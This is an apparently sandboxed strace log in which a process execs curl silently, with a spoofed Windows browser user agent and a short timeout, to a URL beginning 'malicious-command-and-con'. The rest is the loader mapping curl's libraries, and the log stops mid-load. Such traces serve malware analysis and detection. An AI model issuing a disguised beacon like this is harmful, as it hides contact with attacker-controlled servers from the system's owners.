22    10:07:55.571163 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.571362 wait4(-1,  <unfinished ...>
22    10:07:55.571537 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
22    10:07:55.571757 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
22    10:07:55.572157 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
22    10:07:55.572849 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
22    10:07:55.573384 execve("/usr/bin/curl", ["curl", "-s", "-A", "Mozilla/5.0 (Windows NT 10.0; Wi"..., "--connect-timeout", "5", "http://malicious-command-and-con"...], 0x5dc497af3550 /* 8 vars */) = 0
22    10:07:55.574348 brk(NULL)         = 0x5bc86ac2d000
22    10:07:55.574808 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3b405000
22    10:07:55.575215 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
22    10:07:55.576018 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.576691 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
22    10:07:55.577296 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7c3d3b400000
22    10:07:55.577705 mmap(0x7c3d3b401000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7c3d3b401000
22    10:07:55.578104 mmap(0x7c3d3b402000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7c3d3b402000
22    10:07:55.578540 mmap(0x7c3d3b403000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7c3d3b403000
22    10:07:55.578959 close(3</usr/lib/libfake_tracer.so>) = 0
22    10:07:55.579342 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
22    10:07:55.579732 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
22    10:07:55.580188 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
22    10:07:55.580722 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7c3d3b3fe000
22    10:07:55.581250 close(3</etc/ld.so.cache>) = 0
22    10:07:55.581772 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcurl.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>
22    10:07:55.582442 read(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.583324 fstat(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, {st_mode=S_IFREG|0644, st_size=786336, ...}) = 0
22    10:07:55.584076 mmap(NULL, 789456, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0) = 0x7c3d3b33d000
22    10:07:55.584682 mmap(0x7c3d3b34e000, 573440, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x11000) = 0x7c3d3b34e000
22    10:07:55.585211 mmap(0x7c3d3b3da000, 118784, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x9d000) = 0x7c3d3b3da000
22    10:07:55.585673 mmap(0x7c3d3b3f7000, 28672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0xb9000) = 0x7c3d3b3f7000
22    10:07:55.586231 close(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>) = 0
22    10:07:55.586632 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libz.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>
22    10:07:55.587057 read(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.587422 fstat(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, {st_mode=S_IFREG|0644, st_size=113000, ...}) = 0
22    10:07:55.587788 mmap(NULL, 110744, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0) = 0x7c3d3b321000
22    10:07:55.588186 mmap(0x7c3d3b323000, 73728, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x2000) = 0x7c3d3b323000
22    10:07:55.588658 mmap(0x7c3d3b335000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x14000) = 0x7c3d3b335000
22    10:07:55.589100 mmap(0x7c3d3b33b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x1a000) = 0x7c3d3b33b000
22    10:07:55.589546 close(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>) = 0
22    10:07:55.589970 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
22    10:07:55.590417 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
22    10:07:55.590848 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
22    10:07:55.591412 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
22    10:07:55.591947 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
22    10:07:55.592488 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7c3d3b10f000
22    10:07:55.593092 mmap(0x7c3d3b137000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7c3d3b137000
22    10:07:55.593516 mmap(0x7c3d3b2bf000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7c3d3b2bf000
22    10:07:55.593954 mmap(0x7c3d3b30e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7c3d3b30e000
22    10:07:55.594485 mmap(0x7c3d3b314000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c3d3b314000
22    10:07:55.594911 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
22    10:07:55.595322 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libnghttp2.so.14", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>
22    10:07:55.595787 read(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.596230 fstat(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, {st_mode=S_IFREG|0644, st_size=170352, ...}) = 0
22    10:07:55.596637 mmap(NULL, 172272, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0) = 0x7c3d3b0e4000
22    10:07:55.597043 mmap(0x7c3d3b0e9000, 90112, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x5000) = 0x7c3d3b0e9000
22    10:07:55.597467 mmap(0x7c3d3b0ff000, 49152, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x1b000) = 0x7c3d3b0ff000
22    10:07:55.597871 mmap(0x7c3d3b10b000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>, 0x26000) = 0x7c3d3b10b000
22    10:07:55.598290 close(3</usr/lib/x86_64-linux-gnu/libnghttp2.so.14.26.0>) = 0
22    10:07:55.598696 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>
22    10:07:55.599406 read(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.599919 fstat(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, {st_mode=S_IFREG|0644, st_size=133192, ...}) = 0
22    10:07:55.600387 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3b0e2000
22    10:07:55.600798 mmap(NULL, 135184, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0) = 0x7c3d3b0c0000
22    10:07:55.601204 mmap(0x7c3d3b0c2000, 16384, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x2000) = 0x7c3d3b0c2000
22    10:07:55.601610 mmap(0x7c3d3b0c6000, 106496, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x6000) = 0x7c3d3b0c6000
22    10:07:55.602011 mmap(0x7c3d3b0e0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>, 0x1f000) = 0x7c3d3b0e0000
22    10:07:55.602444 close(3</usr/lib/x86_64-linux-gnu/libidn2.so.0.4.0>) = 0
22    10:07:55.602838 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/librtmp.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>
22    10:07:55.603265 read(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.603663 fstat(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, {st_mode=S_IFREG|0644, st_size=121848, ...}) = 0
22    10:07:55.604078 mmap(NULL, 119712, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0) = 0x7c3d3b0a2000
22    10:07:55.604737 mmap(0x7c3d3b0a7000, 69632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x5000) = 0x7c3d3b0a7000
22    10:07:55.605225 mmap(0x7c3d3b0b8000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x16000) = 0x7c3d3b0b8000
22    10:07:55.605650 mmap(0x7c3d3b0be000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/librtmp.so.1>, 0x1c000) = 0x7c3d3b0be000
22    10:07:55.606093 close(3</usr/lib/x86_64-linux-gnu/librtmp.so.1>) = 0
22    10:07:55.606503 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssh.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>
22    10:07:55.606963 read(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.607464 fstat(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, {st_mode=S_IFREG|0644, st_size=462360, ...}) = 0
22    10:07:55.608121 mmap(NULL, 464400, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0) = 0x7c3d3b030000
22    10:07:55.608642 mmap(0x7c3d3b03e000, 294912, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0xe000) = 0x7c3d3b03e000
22    10:07:55.609171 mmap(0x7c3d3b086000, 98304, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x56000) = 0x7c3d3b086000
22    10:07:55.609617 mmap(0x7c3d3b09e000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>, 0x6d000) = 0x7c3d3b09e000
22    10:07:55.610064 close(3</usr/lib/x86_64-linux-gnu/libssh.so.4.9.6>) = 0
22    10:07:55.610498 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libpsl.so.5", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>
22    10:07:55.610969 read(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.611396 fstat(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, {st_mode=S_IFREG|0644, st_size=75768, ...}) = 0
22    10:07:55.611825 mmap(NULL, 77840, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0) = 0x7c3d3b01c000
22    10:07:55.612283 mmap(0x7c3d3b01e000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x2000) = 0x7c3d3b01e000
22    10:07:55.612715 mmap(0x7c3d3b020000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x4000) = 0x7c3d3b020000
22    10:07:55.613149 mmap(0x7c3d3b02e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>, 0x11000) = 0x7c3d3b02e000
22    10:07:55.613590 close(3</usr/lib/x86_64-linux-gnu/libpsl.so.5.3.4>) = 0
22    10:07:55.614013 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libssl.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libssl.so.3>
22    10:07:55.614452 read(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.614897 fstat(3</usr/lib/x86_64-linux-gnu/libssl.so.3>, {st_mode=S_IFREG|0644, st_size=696512, ...}) = 0
22    10:07:55.615426 mmap(NULL, 694384, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0) = 0x7c3d3af72000
22    10:07:55.615995 mmap(0x7c3d3af90000, 401408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x1e000) = 0x7c3d3af90000
22    10:07:55.616663 mmap(0x7c3d3aff2000, 114688, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x80000) = 0x7c3d3aff2000
22    10:07:55.617149 mmap(0x7c3d3b00e000, 57344, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libssl.so.3>, 0x9c000) = 0x7c3d3b00e000
22    10:07:55.617670 close(3</usr/lib/x86_64-linux-gnu/libssl.so.3>) = 0
22    10:07:55.618206 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>
22    10:07:55.618674 read(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.619077 fstat(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, {st_mode=S_IFREG|0644, st_size=5309400, ...}) = 0
22    10:07:55.619508 mmap(NULL, 5323728, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0) = 0x7c3d3aa5e000
22    10:07:55.619908 mmap(0x7c3d3ab11000, 3358720, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0xb3000) = 0x7c3d3ab11000
22    10:07:55.620386 mmap(0x7c3d3ae45000, 831488, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x3e7000) = 0x7c3d3ae45000
22    10:07:55.620791 mmap(0x7c3d3af10000, 389120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>, 0x4b1000) = 0x7c3d3af10000
22    10:07:55.621209 mmap(0x7c3d3af6f000, 11216, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c3d3af6f000
22    10:07:55.621625 close(3</usr/lib/x86_64-linux-gnu/libcrypto.so.3>) = 0
22    10:07:55.622032 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libgssapi_krb5.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>
22    10:07:55.622470 read(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.622867 fstat(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, {st_mode=S_IFREG|0644, st_size=338696, ...}) = 0
22    10:07:55.623272 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c3d3aa5c000
22    10:07:55.623672 mmap(NULL, 341080, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0) = 0x7c3d3aa08000
22    10:07:55.624083 mmap(0x7c3d3aa14000, 237568, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0xc000) = 0x7c3d3aa14000
22    10:07:55.624517 mmap(0x7c3d3aa4e000, 40960, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x46000) = 0x7c3d3aa4e000
22    10:07:55.624926 mmap(0x7c3d3aa58000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>, 0x4f000) = 0x7c3d3aa58000
22    10:07:55.625362 close(3</usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2>) = 0
22    10:07:55.625760 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libldap.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>
22    10:07:55.626363 read(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.626859 fstat(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=372400, ...}) = 0
22    10:07:55.627282 mmap(NULL, 383832, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0) = 0x7c3d3a9aa000
22    10:07:55.627703 mmap(0x7c3d3a9b8000, 245760, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0xe000) = 0x7c3d3a9b8000
22    10:07:55.628193 mmap(0x7c3d3a9f4000, 61440, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x4a000) = 0x7c3d3a9f4000
22    10:07:55.628655 mmap(0x7c3d3aa03000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>, 0x58000) = 0x7c3d3aa03000
22    10:07:55.629097 mmap(0x7c3d3aa06000, 7000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c3d3aa06000
22    10:07:55.629531 close(3</usr/lib/x86_64-linux-gnu/libldap.so.2.0.200>) = 0
22    10:07:55.629956 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/liblber.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>
22    10:07:55.630424 read(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.630846 fstat(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, {st_mode=S_IFREG|0644, st_size=59888, ...}) = 0
22    10:07:55.631268 mmap(NULL, 61864, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0) = 0x7c3d3a99a000
22    10:07:55.631691 mmap(0x7c3d3a99d000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0x3000) = 0x7c3d3a99d000
22    10:07:55.632337 mmap(0x7c3d3a9a5000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xb000) = 0x7c3d3a9a5000
22    10:07:55.633039 mmap(0x7c3d3a9a8000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>, 0xd000) = 0x7c3d3a9a8000
22    10:07:55.633656 close(3</usr/lib/x86_64-linux-gnu/liblber.so.2.0.200>) = 0
22    10:07:55.634081 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libzstd.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>
22    10:07:55.634571 read(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.634987 fstat(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, {st_mode=S_IFREG|0644, st_size=755864, ...}) = 0
22    10:07:55.635415 mmap(NULL, 757816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0) = 0x7c3d3a8e0000
22    10:07:55.635835 mmap(0x7c3d3a8e4000, 684032, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0x4000) = 0x7c3d3a8e4000
22    10:07:55.636308 mmap(0x7c3d3a98b000, 53248, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xab000) = 0x7c3d3a98b000
22    10:07:55.636827 mmap(0x7c3d3a998000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>, 0xb7000) = 0x7c3d3a998000
22    10:07:55.637275 close(3</usr/lib/x86_64-linux-gnu/libzstd.so.1.5.5>) = 0
22    10:07:55.637676 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlidec.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>
22    10:07:55.638116 read(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
22    10:07:55.638517 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=51512, ...}) = 0
22    10:07:55.638917 mmap(NULL, 53352, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.1.0>, 0) = 0x7c3d3a8d2000
